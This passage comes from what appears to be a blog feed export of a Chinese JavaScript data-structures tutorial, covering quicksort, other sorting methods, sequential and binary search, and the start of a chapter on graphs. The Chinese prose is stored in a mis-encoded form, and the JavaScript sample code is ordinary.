·å°†å®ƒä»¬åˆ†å‰²å¼€ï¼‰ å¿«é€ŸæŽ’åºæ¯”ç›®å‰ä¹‹å‰çš„æŽ’åºç®—æ³•è¦è´Ÿè´£ä¸€äº›ã€‚ é¦–å…ˆï¼Œä»Žæ•°ç»„ä¸­é€‰æ‹©ä¸­é—´ä¸€é¡¹ä½œä¸ºä¸»å…ƒ åˆ›å»ºä¸¤ä¸ªæŒ‡é’ˆï¼Œå·¦è¾¹ä¸€ä¸ªæŒ‡å‘æ•°ç»„çš„ç¬¬ä¸€é¡¹ï¼Œå³è¾¹ä¸€ä¸ªæŒ‡å‘æ•°ç»„æœ€åŽä¸€é¡¹ã€‚ç§»åŠ¨å·¦æŒ‡é’ˆçŸ¥é“æˆ‘ä»¬æ‰¾åˆ°ä¸€ä¸ªæ¯”ä¸»å…ƒå¤§çš„å…ƒç´ ï¼ŒæŽ¥ç€ï¼Œç§»åŠ¨å³æŒ‡é’ˆç›´åˆ°æ‰¾åˆ°ä¸€ä¸ªæ¯”ä¸»å…ƒå°çš„å…ƒç´ ï¼Œç„¶åŽäº¤æ¢å®ƒä»¬ï¼Œé‡å¤è¿™ä¸ªè¿‡ç¨‹ï¼Œç›´åˆ°å·¦æŒ‡é’ˆè¶…è¿‡äº†å³æŒ‡é’ˆã€‚è¿™ä¸ªè¿‡ç¨‹å°†ä½¿å¾—æ¯”ä¸»å…ƒå°çš„å€¼éƒ½æŽ’åœ¨ä¸»å…ƒä¹‹å‰ï¼Œè€Œæ¯”ä¸»å…ƒå¤§çš„å€¼éƒ½æŽ’åœ¨ä¸»å…ƒä¹‹åŽã€‚è¿™ä¸€æ­¥å«åšåˆ’åˆ†æ“ä½œã€‚ æŽ¥ç€ï¼Œç®—æ³•å¯¹åˆ’åˆ†åŽçš„å°æ•°ç»„ï¼ˆè¾ƒä¸»å…ƒå°çš„å€¼ç»„æˆçš„å­æ•°ç»„ï¼Œä»¥åŠè¾ƒä¸»å…ƒå¤§çš„å€¼ç»„æˆçš„å­æ•°ç»„ï¼‰é‡å¤ä¹‹å‰çš„ä¸¤ä¸ªæ­¥éª¤ï¼Œç›´åˆ°æ•°ç»„å·²å®Œå…¨æŽ’åºã€‚ å®žçŽ°ï¼š 1234// å¿«é€ŸæŽ’åºthis.quickSort = function()&#123; this.quick(array,0,array.length-1);&#125; åƒå½’å¹¶ç®—æ³•é‚£æ ·ï¼Œå¼€å§‹æˆ‘ä»¬å£°æ˜Žä¸€ä¸ªä¸»æ–¹æ³•æ¥è°ƒç”¨é€’å½’å‡½æ•°ï¼Œä¼ é€’å¾…æŽ’åºæ•°ç»„ï¼Œå·²ç»ç´¢å¼•0åŠå…¶æœ€æœ«çš„ä½ç½®ä½œä¸ºå‚æ•°ã€‚ 123456789101112this.quick = function(array,left,right)&#123; var index; if(array.length &gt; 1)&#123; index = partition(array,left,right); if(left &lt; index - 1 )&#123; arguments.callee(array,left,index-1); &#125; if(index &lt; right)&#123; arguments.callee(array,index,right); &#125; &#125;&#125; é¦–å…ˆå£°æ˜Ž index ï¼Œè¯¥å˜é‡èƒ½å¸®åŠ©æˆ‘ä»¬å°†å­æ•°ç»„åˆ†ç¦»æˆè¾ƒå°å€¼æ•°ç»„å’Œè¾ƒå¤§å€¼æ•°ç»„ï¼Œè¿™æ ·ï¼Œæˆ‘ä»¬å°±èƒ½å†æ¬¡é€’å½’çš„è°ƒç”¨quickå‡½æ•°äº†ã€‚partition å‡½æ•°è¿”å›žå€¼å°†èµ‹å€¼ç»™ index. å¦‚æžœæ•°ç»„çš„é•¿åº¦æ¯”1å¤§ï¼Œæˆ‘ä»¬å°±å¯¹ç»™å®šå­æ•°ç»„æ‰§è¡Œ partition æ“ä½œä»¥å¾—åˆ° index ã€‚å¦‚æžœå­æ•°ç»„å­˜åœ¨è¾ƒå°å€¼çš„å…ƒç´ ï¼Œåˆ™å¯¹è¯¥æ•°ç»„é‡å¤è¿™ä¸ªè¿‡ç¨‹ã€‚åŒç†ï¼Œå¯¹å­˜åœ¨è¾ƒå¤§å€¼çš„å­æ•°ç»„ä¹Ÿæ˜¯å¦‚æ­¤ã€‚ åˆ’åˆ†è¿‡ç¨‹ ç¬¬ä¸€ä»¶è¦åšçš„äº‹æƒ…å°±æ˜¯é€‰ä¸­ä¸»å…ƒï¼ˆpivotï¼‰,æœ‰å¥½å‡ ç§æ–¹å¼ï¼Œæœ€ç®€å•çš„ä¸€ç§å°±æ˜¯é€‰ä¸­æ•°ç»„çš„ç¬¬ä¸€é¡¹ï¼ˆæœ€å·¦é¡¹ï¼‰ã€‚ç„¶è€Œï¼Œç ”ç©¶è¡¨æ˜Žå¯¹äºŽå‡ ä¹Žå·²æŽ’åºçš„æ•°ç»„ï¼Œè¿™ä¸æ˜¯ä¸€ä¸ªå¥½çš„é€‰æ‹©ï¼Œå®ƒå°†å¯¼è‡´è¯¥ç®—æ³•çš„æœ€å·®è¡¨çŽ°ã€‚å¦å¤–ä¸€ç§æ–¹å¼æ˜¯éšæœºé€‰æ‹©ä¸€ä¸ªæ•°ç»„æˆ–æ˜¯é€‰æ‹©ä¸­é—´é¡¹ã€‚ 12345678910111213141516171819function partition(array,left,right)&#123; var pivot = array[Math.floor((left+right) / 2)], i = left, j = right; while(i &lt;= j)&#123; while(array[i] &lt; pivot)&#123; i++ &#125; while(array[j] &gt; pivot)&#123; j-- &#125; if(i &lt;= j)&#123; [array[i],array[j]] = [array[j],array[i]]; i++; j-- &#125; &#125; return i;&#125; ä¸Šé¢çš„å®žçŽ°ä¸­ï¼Œæˆ‘ä»¬é€‰ä¸­ä¸­é—´é¡¹ä½œä¸ºä¸»å…ƒã€‚æˆ‘ä»¬åˆå§‹åŒ–ä¸¤ä¸ªæŒ‡é’ˆï¼šleftï¼Œåˆå§‹åŒ–ä¸ºæ•°ç»„ç¬¬ä¸€ä¸ªå…ƒç´ ï¼Œrightï¼Œåˆå§‹åŒ–ä¸ºæ•°ç»„æœ€åŽä¸€ä¸ªå…ƒç´ ã€‚ åªè¦leftå’ŒrightæŒ‡é’ˆæ²¡æœ‰ç›¸äº’äº¤é”™ï¼Œå°±æ‰§è¡Œåˆ’åˆ†æ“ä½œã€‚é¦–å…ˆï¼Œå…ˆç§»åŠ¨leftæŒ‡é’ˆç›´åˆ°æ‰¾åˆ°ä¸€ä¸ªå…ƒç´ æ¯”ä¸»å…ƒå¤§ã€‚å¯¹äºŽrightæŒ‡é’ˆï¼Œæˆ‘ä»¬åšåŒæ ·çš„äº‹æƒ…ï¼Œç§»åŠ¨rightæŒ‡é’ˆç›´åˆ°æˆ‘ä»¬æ‰¾åˆ°ä¸€ä¸ªå…ƒç´ æ¯”ä¸»å…ƒå°ã€‚ å½“å·¦æŒ‡é’ˆæŒ‡å‘çš„å…ƒç´ æ¯”ä¸»å…ƒå¤§ä¸”å³æŒ‡é’ˆæŒ‡å‘çš„å…ƒç´ æ¯”ä¸»å…ƒå°ï¼Œå¹¶ä¸”æ­¤æ—¶å·¦æŒ‡é’ˆç´¢å¼•æ²¡æœ‰å³æŒ‡é’ˆç´¢å¼•å¤§ï¼Œæ„æ€æ˜¯å·¦é¡¹æ¯”å³é¡¹å¤§ã€‚æˆ‘ä»¬äº¤æ¢å®ƒä»¬ï¼Œç„¶åŽç§»åŠ¨ä¸¤ä¸ªæŒ‡é’ˆï¼Œå¹¶é‡å¤è¿™ä¸ªè¿‡ç¨‹ã€‚ åœ¨åˆ’åˆ†æ“ä½œç»“æŸåŽï¼Œè¿”å›žå·¦æŒ‡é’ˆçš„ç´¢å¼•ï¼Œç”¨æ¥åœ¨åˆ›å»ºå­æ•°ç»„ã€‚ å¿«é€ŸæŽ’åºå®žæˆ˜ çœ‹ä¸€ä¸ªå¿«é€ŸæŽ’åºçš„å®žé™…ä¾‹å­ ç»™å®šæ•°ç»„ï¼ˆ[3,5,1,6,4,7,2]ï¼‰ï¼Œå‰é¢çš„ç¤ºæ„å›¾å±•ç¤ºäº†åˆ’åˆ†æ“ä½œçš„ç¬¬ä¸€æ¬¡æ‰§è¡Œã€‚ ä¸‹é¢çš„ç¤ºæ„å›¾å±•ç¤ºäº†å¯¹æœ‰è¾ƒå°å€¼çš„å­æ•°ç»„æ‰§è¡Œçš„åˆ’åˆ†ï¼ˆæ³¨æ„7å’Œ6ä¸åŒ…å«åœ¨å­æ•°ç»„ä¹‹å†…ï¼‰ æŽ¥ç€ï¼Œæˆ‘ä»¬ç»§ç»­åˆ›å»ºå­æ•°ç»„ï¼Œä½†æ˜¯è¿™æ¬¡æ“ä½œæ˜¯é’ˆå¯¹ä¸Šå›¾ä¸­æœ‰è¾ƒå¤§å€¼çš„å­æ•°ç»„ï¼ˆæœ‰1é‚£ä¸ªè¾ƒå°æ•°ç»„ä¸ç”¨å†åˆ’åˆ†äº†ï¼Œå› ä¸ºå®ƒä»…å«æœ‰ä¸€ä¸ªé¡¹ï¼‰ å­æ•°ç»„ï¼ˆ[2,3,5,4]ï¼‰ä¸­çš„è¾ƒå°æ•°ç»„ï¼ˆ[2,3]ï¼‰ç»§ç»­åˆ’åˆ†ã€‚ ç„¶åŽå­æ•°ç»„ï¼ˆ[2,3,5,4]ï¼‰ä¸­è¾ƒå¤§æ•°ç»„ï¼ˆ[5,4]ï¼‰ä¹Ÿç»§ç»­è¿›è¡Œåˆ’åˆ†ï¼Œç¤ºæ„å›¾å¦‚ä¸‹ æœ€ç»ˆï¼Œè¾ƒå¤§å­æ•°ç»„ï¼ˆ[6,7]ï¼‰ä¹Ÿä¼šè¿›è¡Œç»§ç»­åˆ’åˆ†æ“ä½œï¼Œå¿«é€ŸæŽ’åºç®—æ³•çš„æ“ä½œæ‰§è¡Œå®Œæˆã€‚ è®¡æ•°æŽ’åºã€æ¡¶æŽ’åºå’ŒåŸºæ•°æŽ’åºï¼ˆåˆ†å¸ƒå¼æŽ’åºï¼‰ç›®å‰ä¸ºæ­¢ï¼Œå·²ç»å­¦ä¹ äº†å¦‚ä½•ä¸å€ŸåŠ©ä»»ä½•è¾…åŠ©æ•°æ®ç»“æž„çš„æƒ…å†µä¸‹å¯¹æ•°ç»„è¿›è¡ŒæŽ’åºã€‚è¿˜æœ‰ä¸€ç±»è¢«ç§°ä¸ºåˆ†å¸ƒå¼æŽ’åºçš„ç®—æ³•ï¼ŒåŽŸå§‹æ•°ç»„ä¸­çš„æ•°æ®ä¼šåˆ†å‘åˆ°å¤šä¸ªä¸­é—´ç»“æž„ï¼ˆæ¡¶ï¼‰ï¼Œå†åˆèµ·æ¥æ”¾å›žåŽŸå§‹æ•°ç»„ã€‚ æœ€è‘—åçš„åˆ†å¸ƒå¼ç®—æ³•æœ‰è®¡æ•°æŽ’åºã€æ¡¶æŽ’åºå’ŒåŸºæ•°æŽ’åºã€‚è¿™é‡Œä¸åšå±•å¼€ï¼Œæœ‰å…´è¶£çš„è¯·è‡ªè¡Œç™¾åº¦ã€‚ æŽ’åºçš„ç›¸å…³ä»£ç 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160function createNonSortedArray(size)&#123; var array = new ArrayList(); for(var i = size; i &gt; 0; i--)&#123; array.insert(i); &#125; return array;&#125;function merge(left,right)&#123; var result = [], il = 0, ir = 0; while(il &lt; left.length &amp;&amp; ir &lt; right.length)&#123; if(left[il] &lt; right[ir])&#123; result.push(left[il++]); &#125;else&#123; result.push(right[ir++]); &#125; &#125; while(il &lt; left.length)&#123; result.push(left[il++]); &#125; while(ir &lt; right.length)&#123; result.push(right[ir++]); &#125; return result; &#125;function partition(array,left,right)&#123; var pivot = array[Math.floor((left+right) / 2)], i = left, j = right; while(i &lt;= j)&#123; while(array[i] &lt; pivot)&#123; i++ &#125; while(array[j] &gt; pivot)&#123; j-- &#125; if(i &lt;= j)&#123; [array[i],array[j]] = [array[j],array[i]]; i++; j-- &#125; &#125; return i;&#125;function ArrayList()&#123; var array = []; this.insert = function(item)&#123; array.push(item); &#125; this.toString = function()&#123; return array.join(); &#125; this.swap = function(index1,index2)&#123; var aux = array[index1]; array[index1] = array[index2]; array[index2] = aux; // [array[index1],array[index2]] = [array[index2],array[index1]] &#125; // å†’æ³¡æŽ’åº this.bubbleSort = function()&#123; var length = array.length; for(var i = 0; i &lt;length; i++)&#123; for(var j = 0; j &lt; length -1; j++)&#123; if(array[j] &gt; array[j+1])&#123; this.swap(j,j+1); &#125; &#125; &#125; &#125; // æ”¹è¿›åŽçš„å†’æ³¡æŽ’åº this.modifiedBubbleSort = function()&#123; var length = array.length; for(var i = 0; i &lt;length; i++)&#123; for(var j = 0; j &lt; length-1-i; j++)&#123; if(array[j] &gt; array[j+1])&#123; this.swap(j,j+1); &#125; &#125; &#125; &#125; // é€‰æ‹©æŽ’åº this.selectionSort = function()&#123; var length = array.length, indexMin; for(var i = 0; i &lt; length; i++)&#123; indexMin = i; for(var j = i; j &lt; length; j++)&#123; if(array[indexMin] &gt; array[j])&#123; indexMin = j; &#125; &#125; if(i !== indexMin)&#123; this.swap(i,indexMin); &#125; &#125; &#125; // æ’å…¥æŽ’åº this.insertionSort = function()&#123; var length = array.length, j, temp; for(var i = 0; i &lt;length; i++)&#123; j = i; temp = array[i]; while(j &gt; 0 &amp;&amp; array[j - 1] &gt; temp)&#123; array[j] = array[j - 1] j--; &#125; array[j] = temp; &#125; &#125; // å½’å¹¶æŽ’åº this.mergeSort = function()&#123; array = this.mergeSortRec(array); &#125; this.mergeSortRec = function(array)&#123; var length = array.length; if(length === 1)&#123; return array; &#125; var mid = Math.floor(length/2), left = array.slice(0,mid), right = array.slice(mid,length); return merge(arguments.callee(left),arguments.callee(right)); &#125; // å¿«é€ŸæŽ’åº this.quickSort = function()&#123; this.quick(array,0,array.length-1); &#125; this.quick = function(array,left,right)&#123; console.log(left+' '+right); var index; if(array.length &gt; 1)&#123; index = partition(array,left,right); if(left &lt; index - 1 )&#123; arguments.callee(array,left,index-1); &#125; if(index &lt; right)&#123; arguments.callee(array,index,right); &#125; &#125; &#125;&#125;// var array = createNonSortedArray(5);// console.log(array.toString());// array.quickSort();// console.log(array.toString()); const quickSortArray = new ArrayList();quickSortArray.insert(3);quickSortArray.insert(5);quickSortArray.insert(1);quickSortArray.insert(6);quickSortArray.insert(4);quickSortArray.insert(7);quickSortArray.insert(2);console.log(quickSortArray.toString());quickSortArray.quickSort();console.log(quickSortArray.toString()); æœç´¢ç®—æ³•å›žé¡¾ä¸€ä¸‹ä¹‹å‰å­¦è¿‡çš„ç®—æ³•ï¼Œæˆ‘ä»¬ä¼šå‘çŽ°BinarySearch Tree ç±»çš„searchä»¥åŠLinkedListç±»çš„indexOf æ–¹æ³•ç­‰éƒ½æ˜¯æœç´¢ç®—æ³•ã€‚å½“ç„¶ï¼Œå®ƒä»¬éƒ½æ˜¯æ ¹æ®å„è‡ªçš„æ•°æ®ç»“æž„æ¥å®žçŽ°çš„ã€‚æ‰€ä»¥æˆ‘ä»¬å…¶å®žå·²ç»ç†Ÿæ‚‰ä¸¤ä¸ªæœç´¢ç®—æ³•äº†ï¼Œåªæ˜¯è¿˜ä¸çŸ¥é“å®ƒä»¬çš„æ­£å¼åç§°è€Œå·²ã€‚ é¡ºåºæœç´¢é¡ºåºæˆ–è€…çº¿æ€§æœç´¢æ˜¯åŸºæœ¬çš„æœç´¢ç®—æ³•ã€‚å®ƒçš„æœºåˆ¶æ˜¯ï¼Œå°†æ¯ä¸€ä¸ªæ•°æ®ç»“æž„ä¸­çš„å…ƒç´ å’Œæˆ‘ä»¬è¦æ‰¾çš„å…ƒç´ åšæ¯”è¾ƒã€‚é¡ºåºæœç´¢æ˜¯æœ€ä½Žæ•ˆçš„ä¸€ç§æœç´¢ç®—æ³•ã€‚ 123456789// é¡ºåºæœç´¢this.sequentialSearch = function(item)&#123; for(var i = 0; i &lt; array.length; i++)&#123; if(item === array[i])&#123; return i; &#125; &#125; return -1;&#125; é¡ºåºæœç´¢è¿­ä»£æ•´ä¸ªæ•°ç»„ï¼Œå¹¶å°†æ¯ä¸ªæ•°ç»„å…ƒç´ å’Œæœç´¢é¡¹ä½œæ¯”è¾ƒã€‚å¦‚æžœæœç´¢åˆ°äº†ï¼Œç®—æ³•å°†è¿”å›žå€¼æ¥æ ‡ç¤ºæœç´¢æˆåŠŸã€‚è¿”å›žå€¼å¯ä»¥æ˜¯è¯¥æœç´¢é¡¹æœ¬èº«ï¼Œæˆ–æ˜¯true,åˆæˆ–æ˜¯æœç´¢é¡¹çš„ç´¢å¼•ã€‚å¦‚æžœæ²¡æœ‰æ‰¾åˆ°è¯¥é¡¹ï¼Œåˆ™è¿”å›ž-1ï¼Œè¡¨ç¤ºè¯¥ç´¢å¼•ä¸å­˜åœ¨ï¼Œä¹Ÿå¯ä»¥è€ƒè™‘è¿”å›žfalseæˆ–è€…nullã€‚ å‡å®šæœ‰æ•°ç»„ï¼ˆ[5,4,3,2,1]ï¼‰å’Œå¾…æœç´¢å€¼3ï¼Œä¸‹å›¾å±•ç¤ºäº†é¡ºåºæœç´¢çš„ç¤ºæ„å›¾ äºŒåˆ†æœç´¢äºŒåˆ†æœç´¢ç®—æ³•çš„åŽŸç†å’Œèœæ•°å­—æ¸¸æˆç±»ä¼¼ã€‚æˆ‘ä»¬æ¯å›žåº”ä¸€ä¸ªæ•°å­—ã€‚é‚£ä¸ªäººå°±ä¼šè¯´è¿™ä¸ªæ•°å­—æ˜¯é«˜äº†è¿˜æ˜¯ä½Žäº†æˆ–è€…æ˜¯å¯¹äº†ã€‚ è¿™ä¸ªç®—æ³•è¦æ±‚è¢«æœç´¢çš„æ•°æ®ç»“æž„å·²ç»æŽ’åºã€‚ä»¥ä¸‹æ˜¯è¯¥ç®—æ³•éµå¾ªçš„æ­¥éª¤ é€‰æ‹©æ•°ç»„çš„ä¸­é—´å€¼ å¦‚æžœé€‰ä¸­å€¼æ˜¯å¾…æœç´¢å€¼ï¼Œé‚£ä¹ˆç®—æ³•æ‰§è¡Œå®Œæ¯• å¦‚æžœå¾…æœç´¢å€¼æ¯”é€‰ä¸­çš„å°ï¼Œåˆ™è¿”å›žæ­¥éª¤1å¹¶åœ¨é€‰ä¸­å€¼çš„å·¦è¾¹çš„å­æ•°ç»„ä¸­å¯»æ‰¾ å¦‚æžœå¾…æœç´¢å€¼æ¯”é€‰ä¸­çš„å¤§ï¼Œåˆ™è¿”å›žæ­¥éª¤1å¹¶åœ¨é€‰ä¸­å€¼çš„å³è¾¹çš„å­æ•°ç»„ä¸­å¯»æ‰¾ å®žçŽ°ï¼š 12345678910111213141516171819// äºŒåˆ†æœç´¢this.binarySearch = function(item)&#123; this.quickSort(); var low = 0, high = array.length - 1, mid,element; while(low &lt;= high)&#123; mid = Math.floor((low + high)/2); element = array[mid]; if(element &lt; item)&#123; low = mid + 1; &#125;else if(element &gt; item)&#123; high = mid - 1; &#125;else&#123; return mid; &#125; &#125; return -1;&#125; å¼€å§‹å‰éœ€è¦å…ˆæŽ’åºæ•°ç»„ï¼Œæˆ‘ä»¬è¿™è¿™é‡Œé€‰æ‹©äº†å¿«é€ŸæŽ’åºã€‚åœ¨æ•°ç»„æŽ’åºä¹‹åŽï¼Œæˆ‘ä»¬è®¾ç½®lowå’ŒhighæŒ‡é’ˆï¼ˆå®ƒä»¬æ˜¯è¾¹ç•Œï¼‰ å½“lowæ¯”highå°æ—¶ï¼Œæˆ‘ä»¬è®¡ç®—å¾—åˆ°ä¸­é—´é¡¹ç´¢å¼•å¹¶å–å¾—ä¸­é—´é¡¹çš„å€¼ï¼Œæ­¤å¤„å¦‚æžœlowæ¯”highå¤§ï¼Œåˆ™æ„æ€æ˜¯è¯¥æœç´¢å€¼ä¸å­˜åœ¨å¹¶è¿”å›ž-1.æŽ¥ç€ï¼Œæˆ‘ä»¬æ¯”è¾ƒé€‰ä¸­é¡¹çš„å€¼å’Œæœç´¢å€¼ã€‚å¦‚æžœå°äº†ï¼Œåˆ™é€‰æ‹©æ•°ç»„ä½ŽåŠè¾¹å¹¶é‡æ–°å¼€å§‹ã€‚å¦‚æžœé€‰ä¸­é¡¹çš„å€¼æ¯”æœç´¢å€¼å¤§äº†ï¼Œåˆ™é€‰æ‹©æ•°ç»„é«˜åŠè¾¹å¹¶é‡æ–°å¼€å§‹ã€‚è‹¥ä¸¤è€…éƒ½ä¸æ˜¯ï¼Œåˆ™æ„å‘³ç€é€‰ä¸­é¡¹çš„å€¼å’Œæœç´¢å€¼ç›¸ç­‰ï¼Œå› æ­¤ï¼Œç›´æŽ¥è¿”å›žè¯¥ç´¢å¼•ã€‚ ç»™å®šä¸‹å›¾æ‰€ç¤ºæ•°ç»„ï¼Œè¯•è¯•æœç´¢2.è¿™æ˜¯ç®—æ³•å°†ä¼šæ‰§è¡Œçš„æ­¥éª¤ï¼š å°ç»“æœ¬ç« ä»‹ç»äº†æŽ’åºå’Œæœç´¢ç®—æ³•ï¼ŒåŒ…æ‹¬å†’æ³¡ã€é€‰æ‹©ã€æ’å…¥ã€å½’å¹¶å’Œå¿«é€ŸæŽ’åºï¼Œè¿˜æœ‰é¡ºåºæœç´¢å’ŒäºŒåˆ†æœç´¢ã€‚ä¸‹ä¸€ç« å­¦ä¹ ä¸€äº›é«˜çº§ç®—æ³•æŠ€å·§ã€‚ ä¹¦ç±é“¾æŽ¥ï¼š å­¦ä¹ JavaScriptæ•°æ®ç»“æž„ä¸Žç®—æ³•]]></content>
      <categories>
        <category>javaScriptç›¸å…³</category>
      </categories>
      <tags>
        <tag>javaScriptæ•°æ®ç»“æž„ä¸Žç®—æ³•</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[ä¸ºä»€ä¹ˆæˆ‘è¦æ”¾å¼ƒjavaScriptæ•°æ®ç»“æž„ä¸Žç®—æ³•ï¼ˆç¬¬ä¹ç« ï¼‰â€”â€” å›¾]]></title>
    <url>%2F2018-11-06-JavaScipt%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E4%B8%8E%E7%AE%97%E6%B3%95Part9.html</url>
    <content type="text"><![CDATA[æœ¬ç« ä¸­ï¼Œå°†å­¦ä¹ å¦å¤–ä¸€ç§éžçº¿æ€§æ•°æ®ç»“æž„â€”â€”å›¾ã€‚è¿™æ˜¯å­¦ä¹ çš„æœ€åŽä¸€ç§æ•°æ®ç»“æž„ï¼ŒåŽé¢å°†å­¦ä¹ æŽ’åºå’Œæœç´¢ç®—æ³•ã€‚ ç¬¬ä¹ç«  å›¾å›¾çš„ç›¸å…³æœ¯è¯­å›¾æ˜¯ç½‘ç»œç»“æž„çš„æŠ½è±¡æ¨¡åž‹ã€‚å›¾æ˜¯ä¸€ç»„ç”±è¾¹è¿žæŽ¥çš„èŠ‚ç‚¹ï¼ˆæˆ–é¡¶ç‚¹ï¼‰ã€‚å­¦ä¹ å›¾æ˜¯é‡è¦çš„ï¼Œå› ä¸ºåœ¨ä»»ä½•äºŒå…ƒå…³ç³»éƒ½å¯ä»¥ç”¨å›¾æ¥è¡¨ç¤ºã€‚ ä»»ä½•ç¤¾äº¤ç½‘ç»œéƒ½å¯ä»¥ç”¨å›¾æ¥è¡¨ç¤ºã€‚ æˆ‘ä»¬è¿˜å¯ä»¥ç”¨å›¾æ¥è¡¨ç¤ºé“è·¯ã€èˆªç­ä»¥åŠé€šä¿¡çŠ¶æ€ ä¸€ä¸ªå›¾ G= ï¼ˆV,Eï¼‰ç”±ä»¥ä¸‹å…ƒç´ ç»„æˆã€‚ Vï¼šä¸€ç»„é¡¶ç‚¹ Eï¼šä¸€ç»„è¾¹ã€‚è¿žæŽ¥Vä¸­çš„é¡¶ç‚¹ ç”±ä¸€æ¡è¾¹è¿žæŽ¥åœ¨ä¸€èµ·çš„é¡¶ç‚¹ç§°ä¸ºç›¸é‚»é¡¶ç‚¹ã€‚æ¯”å¦‚ï¼ŒAå’ŒB æ˜¯ç›¸é‚»çš„ï¼ŒAå’ŒDæ˜¯ç›¸é‚»çš„ï¼ŒAå’ŒCæ˜¯ç›¸é‚»çš„ï¼ŒAå’ŒEæ˜¯ä¸ç›¸é‚»çš„ã€‚ ä¸€ä¸ªé¡¶ç‚¹çš„åº¦æ˜¯å…¶ç›¸é‚»é¡¶ç‚¹çš„æ•°é‡ã€‚æ¯”å¦‚ï¼ŒAå’Œå…¶ä»–ä¸‰ä¸ªé¡¶ç‚¹ç›¸è¿žæŽ¥ï¼Œå› æ­¤ï¼ŒAçš„åº¦ä¸º3ï¼›Eå’Œå…¶ä»–ä¸¤ä¸ªé¡¶ç‚¹ç›¸è¿žæŽ¥ï¼Œå› æ­¤Eçš„åº¦ä¸º2. è·¯å¾„æ˜¯é¡¶ç‚¹v1,v2,â€¦vkçš„ä¸€ä¸ªè¿žç»­åºåˆ—ï¼Œå…¶ä¸­ vi å’Œ vi+1 ï¼ˆä¸‹æ ‡ï¼‰æ˜¯ç›¸é‚»çš„ã€‚ä»¥ä¸Šä¸€ç¤ºæ„å›¾ä¸ºä¾‹ï¼Œå…¶ä¸­åŒ…å«çš„è·¯å¾„A B E I å’Œ A C D Gã€‚ ç®€å•è·¯å¾„è¦æ±‚ä¸åŒ…å«é‡å¤çš„é¡¶ç‚¹ã€‚ä¸¾ä¸ªä¾‹å­ï¼ŒA D Gæ˜¯ä¸€æ¡ç®€å•è·¯å¾„ã€‚é™¤åŽ»æœ€åŽä¸€ä¸ªé¡¶ç‚¹ï¼ˆå› ä¸ºå®ƒå’Œç¬¬ä¸€ä¸ªé¡¶ç‚¹æ˜¯åŒä¸€ä¸ªé¡¶ç‚¹ï¼‰ï¼ŒçŽ¯ä¹Ÿæ˜¯ç®€å•è·¯å¾„ï¼Œæ¯”å¦‚A D C Aï¼ˆæœ€åŽä¸€ä¸ªé¡¶ç‚¹é‡æ–°å›žåˆ°Aï¼‰ å¦‚æžœé€”ä¸­ä¸å­˜åœ¨çŽ¯åˆ™ç§°è¯¥å›¾æ˜¯æ— çŽ¯çš„ã€‚å¦‚æžœå›¾ä¸­æ¯ä¸¤ä¸ªé¡¶ç‚¹é—´éƒ½å­˜åœ¨è·¯å¾„ï¼Œåˆ™è¯¥å›¾æ˜¯è¿žé€šçš„ã€‚ æœ‰å‘å›¾å’Œæ— å‘å›¾ å›¾å¯ä»¥æ˜¯æ— å‘çš„ï¼ˆè¾¹æ²¡æœ‰æ–¹å‘ï¼‰æˆ–æ˜¯æœ‰å‘çš„ï¼ˆæœ‰å‘å›¾ï¼‰ã€‚ä¸‹å›¾å°±æ˜¯æœ‰å‘å›¾ã€‚ æœ‰å‘å›¾çš„è¾¹æœ‰ä¸€ä¸ªæ–¹å‘ã€‚å¦‚æžœå›¾ä¸­æ¯ä¸¤ä¸ªé¡¶ç‚¹é—´åœ¨åŒå‘ä¸Šéƒ½å­˜åœ¨è·¯å¾„ï¼Œåˆ™è¯¥å›¾æ˜¯å¼ºè¿žé€šçš„ã€‚ä¾‹å¦‚ï¼ŒCå’ŒDå°±æ˜¯å¼ºè¿žé€šçš„ã€‚å›¾è¿˜å¯ä»¥æ˜¯æœªåŠ æƒçš„æˆ–è€…åŠ æƒçš„ã€‚åŠ æƒå›¾çš„è¾¹è¢«èµ‹äºˆäº†æƒå€¼ã€‚ æˆ‘ä»¬å¯ä»¥ä½¿ç”¨å›¾æ¥è§£å†³è®¡ç®—æœºç§‘å­¦ä¸–ç•Œä¸­çš„å¾ˆå¤šé—®é¢˜ï¼Œæ¯”å¦‚æœç´¢å›¾ä¸­çš„ä¸€ä¸ªç‰¹å®šé¡¶ç‚¹æˆ–æœç´¢ä¸€æ¡ç‰¹å®šè¾¹ï¼Œå¯»æ‰¾å›¾ä¸­çš„ä¸€æ¡è·¯å¾„ï¼ˆä»Žä¸€ä¸ªé¡¶ç‚¹åˆ°å¦ä¸€ä¸ªé¡¶ç‚¹ï¼‰ï¼Œå¯»æ‰¾ä¸¤ä¸ªé¡¶ç‚¹ä¹‹é—´çš„æœ€çŸ­è·¯å¾„ã€‚ å›¾çš„è¡¨ç¤ºä»Žæ•°æ®ç»“æž„è§’åº¦æ¥è¯´ï¼Œæˆ‘ä»¬æœ‰å¤šç§æ–¹å¼æ¥è¡¨ç¤ºå›¾ã€‚åœ¨æ‰€æœ‰è¡¨ç¤ºæ³•ä¸­ï¼Œä¸å­˜åœ¨ç»å¯¹æ­£ç¡®çš„æ–¹æ³•æ–¹å¼ã€‚å›¾çš„æ­£ç¡®è¡¨ç¤ºæ³•å–å†³äºŽè§£å†³çš„é—®é¢˜å’Œå›¾çš„ç±»åž‹ã€‚ é‚»æŽ¥çŸ©é˜µå›¾æœ€å¸¸è§çš„å®žçŽ°å°±æ˜¯é‚»æŽ¥çŸ©é˜µã€‚æ¯ä¸ªèŠ‚ç‚¹å’Œä¸€ä¸ªæ•´æ•°ç›¸å…³è”ï¼Œè¯¥æ•´æ•°å°†ä½œä¸ºæ•°ç»„çš„ç´¢å¼•ã€‚æˆ‘ä»¬ç”¨ä¸€ä¸ªäºŒç»´æ•°ç»„æ¥è¡¨ç¤ºé¡¶ç‚¹ä¹‹é—´çš„è¿žæŽ¥ã€‚å¦‚æžœç´¢å¼•ä¸ºiçš„èŠ‚ç‚¹å’Œç´¢å¼•ä¸º jçš„èŠ‚ç‚¹ä¸ºé‚»ï¼Œåˆ™ array[i][j] === 1,å¦åˆ™ array[i][j] === 0,å¦‚ä¸‹å›¾æ‰€ç¤ºï¼š 